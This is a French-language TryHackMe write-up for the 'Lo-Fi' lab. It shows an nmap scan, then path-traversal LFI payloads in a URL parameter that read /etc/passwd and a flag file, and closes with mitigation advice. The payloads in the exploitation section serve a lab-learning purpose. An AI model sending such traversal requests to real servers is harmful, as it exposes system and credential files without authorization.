TryHackMe - Lo-Fi Write-Up (FR)

🛠 Informations

Nom de la machine : Lo-Fi

Plateforme : TryHackMe

Difficulté : Facile

Type : Web Exploitation - LFI (Local File Inclusion)


🏁 Objectifs

L'objectif de cette machine est d'exploiter une vulnérabilité LFI (Local File Inclusion) pour récupérer des fichiers sensibles sur le serveur et capturer le flag.

🔍 1. Scan et Reconnaissance

On commence par un scan des ports pour voir quels services sont accessibles.

Scan Nmap

nmap -sC -sV -T4 -p- <IP_de_la_machine>

🔎 Résultat : Le site web est accessible via HTTP sur le port 80.

🌐 2. Analyse du site web

Nous visitons la page principale et analysons l'URL. Nous remarquons que chaque page utilise un paramètre page, par exemple :

http://lo-fi.thm/?page=relax.php

Cela suggère que le site inclut dynamiquement des fichiers PHP.

💥 3. Exploitation - Local File Inclusion (LFI)

Nous testons si la LFI est possible en tentant d'inclure le fichier /etc/passwd.

Test LFI

Nous modifions l'URL comme suit :

http://lo-fi.thm/?page=../../../../etc/passwd

🔎 Résultat : Le fichier /etc/passwd est affiché, confirmant la vulnérabilité !

Extrait du fichier :

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
...

🏆 4. Récupération du Flag

Maintenant que nous avons confirmé la LFI, nous recherchons directement le fichier flag.txt :

http://lo-fi.thm/?page=../../../../flag.txt

🎉 Flag récupéré avec succès !

🔐 5. Protection contre la LFI

Pour éviter ce type de vulnérabilité, voici quelques bonnes pratiques :

Utiliser des chemins absolus et éviter d'inclure des fichiers basés sur l'entrée utilisateur.

Restreindre l'accès aux fichiers sensibles (ex: via des permissions ou un .htaccess).

Filtrer les entrées pour empêcher les séquences ../ qui permettent de remonter dans les dossiers.

Désactiver allow_url_include et allow_url_fopen dans php.ini.

🎯 Conclusion

La machine "Lo-Fi" illustre bien la dangerosité des failles LFI et leur exploitation. En environnement réel, cette vulnérabilité peut mener à l'exposition de données critiques et même à une exécution de code si combinée à d'autres techniques comme le Log Poisoning.

✅ TryHackMe - Lo-Fi complété avec succès ! 🚀
